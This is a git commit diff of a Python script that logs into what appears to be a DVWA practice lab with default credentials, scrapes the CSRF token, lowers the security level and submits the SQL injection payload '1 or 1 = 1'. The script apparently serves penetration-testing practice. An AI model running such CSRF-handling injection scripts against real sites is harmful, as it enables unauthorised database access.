5da1bc18479a8bafca30a5b2b79c7861443f53f8
kymb0 <55473161+kymb0@users.noreply.github.com>
2020-09-30 22:35:49 +0930

    Update bypass_csrf_into_sqli.py

--- Code_templates/bypass_csrf_into_sqli.py
+++ Code_templates/bypass_csrf_into_sqli.py
@@ -1,74 +1,36 @@
-#
-import sys
-import re
-import requests
-from requests import session
-import mechanize
-import cookielib
-import urllib
-import urllib2
-
 from bs4 import BeautifulSoup
-s=requests.Session()
-username="admin"
-password="password"
-login_url="http://192.168.20.130/login.php"
-target = "http://192.168.20.130/vulnerabilities/sqli/" #% (inj_str)
-headers = {'User-Agent': 'Mozilla/5.0'}
+import requests
 
-response = requests.get(login_url, headers=headers, verify=False)
-s.get(login_url)
+s = requests.Session()
 
-soup = BeautifulSoup(s.get(login_url).text)
-csrf_token = soup.find(name="user_token")
-print(csrf_token)
+login_url="http://192.168.20.128/login.php"
+sec_form="http://192.168.20.128/security.php"
+target = "http://192.168.20.128/vulnerabilities/sqli/"
 
-cj = cookielib.CookieJar()
-opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-login_data = urllib.urlencode({
-"username":"%s" %(username),
-"password":"%s" %(password),
-"login":"login",
-"user_token":"%s" %(csrf_token)
-})
-opener.open(login_url, login_data)
+resp = s.get(login_url)
+parsed_html = BeautifulSoup(resp.content, features="html.parser")
+csrf = parsed_html.body.find('input', attrs={'name':'user_token'}).get("value")
 
+login_form = {
+	'username': 'admin',
+	'password': 'password',
+	'Login': 'Login',
+	'user_token':  csrf
+	}
+sec={
+	'security': "low",
+	'seclev_submit': 'Submit',
+	'user_token':  csrf
+	}
+sqli={
+	'id': "1 or 1 = 1",
+	'Submit': 'Submit',
+	'user_token':  csrf
+	}
+	
+response = s.post(login_url, login_form)
+change_sec=s.post(sec_form, sec)
+send_inj = s.post(target, sqli)
 
-
-def sqli(inj_str):
-
-	br = mechanize.Browser()
-	br.set_handle_robots(False)
-	br.set_cookiejar(cj)
-	br.open(target)
-	br.select_form(nr=0)
-   	for f in br.forms():
-		print f
-	br.select_form(nr=0)
-	br.form['id'] = "%s" % (inj_str)
-	br.form['submit'] = "submit"
-	req = br.submit()
-	s = BeautifulSoup(req.text, 'lxml')
-	print "Response Headers:"
-	print br.headers # 
-	print
-	print "Response Content:"
-	print s.text #print soup text (pretty response)
-	print 
-	error = re.search("There was an error", s.text) # search for "Invalid argument" in soups text
-	if error:
-		print "Errors found in response. Possible SQL injection found"
-	else:
-        	print "No errors found"
-        
-def main():
-    if len(sys.argv) != 1:
-        print "(+) usage: %s <injection_string>" % sys.argv[0]
-        print '''(+) eg: %s  "1 or 1 = 1"'''  %sys.argv[0]
-    injection_string = sys.argv[1]
-
-    sqli(injection_string)
-
-if __name__ == "__main__": #fancy trick to check against a definte variable to run our function main
-    main()
-#----
+parsed_html = BeautifulSoup(send_inj.content, features="html.parser")
+print(parsed_html)
